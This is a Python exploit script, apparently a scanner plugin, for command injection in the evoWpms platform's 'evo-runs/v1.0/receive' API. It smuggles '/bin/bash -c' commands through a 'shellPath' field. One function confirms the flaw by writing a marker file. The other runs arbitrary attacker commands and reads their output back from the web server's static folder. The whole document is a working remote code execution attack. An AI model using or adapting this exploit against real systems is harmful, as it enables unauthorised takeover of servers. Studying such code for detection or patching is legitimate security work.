import requests
import random
import string

def _verify(target):
    """验证漏洞是否存在"""
    url = target["target"]
    verify_file = ''.join(random.choices(string.ascii_lowercase, k=8)) + '.txt'
    cmd = f"echo 'vuln' > /opt/evoWpms/static/{verify_file}"
    payload = {
        "method": "agent.ossm.mapping.config",
        "info": {
            "configure": "abcd",
            "filePath": "haha",
            "paramMap": {
                "shellPath": f"/bin/bash -c '{cmd}'",
                "filePath": "abc"
            },
            "requestIp": ""
        }
    }
    api_url = f"{url}/evo-runs/v1.0/receive"
    try:
        resp = requests.post(api_url, json=payload, timeout=10, verify=False)
        if resp.status_code == 200:
            check_url = f"{url}/static/{verify_file}"
            check_resp = requests.get(check_url, timeout=10, verify=False)
            if check_resp.status_code == 200 and 'vuln' in check_resp.text:
                return {'target': url, 'result': f'命令执行成功，验证文件{verify_file}内容：{check_resp.text[:200]}'}
    except Exception:
        pass
    return None

def _cmd_exc(target, cmd):
    """执行任意命令"""
    url = target["target"]
    out_file = ''.join(random.choices(string.ascii_lowercase, k=8)) + '.txt'
    full_cmd = f"{cmd} > /opt/evoWpms/static/{out_file}"
    payload = {
        "method": "agent.ossm.mapping.config",
        "info": {
            "configure": "abcd",
            "filePath": "haha",
            "paramMap": {
                "shellPath": f"/bin/bash -c '{full_cmd}'",
                "filePath": "abc"
            },
            "requestIp": ""
        }
    }
    api_url = f"{url}/evo-runs/v1.0/receive"
    try:
        resp = requests.post(api_url, json=payload, timeout=10, verify=False)
        if resp.status_code == 200:
            check_url = f"{url}/static/{out_file}"
            check_resp = requests.get(check_url, timeout=10, verify=False)
            if check_resp.status_code == 200:
                return {'target': url, 'result': f'命令执行结果：{check_resp.text[:500]}'}
            else:
                return {'target': url, 'result': '命令可能已执行，但无法读取输出文件'}
    except Exception as e:
        return {'target': url, 'result': f'请求异常：{str(e)}'}
    return None

if __name__ == "__main__":
    _verify('http://example.com')

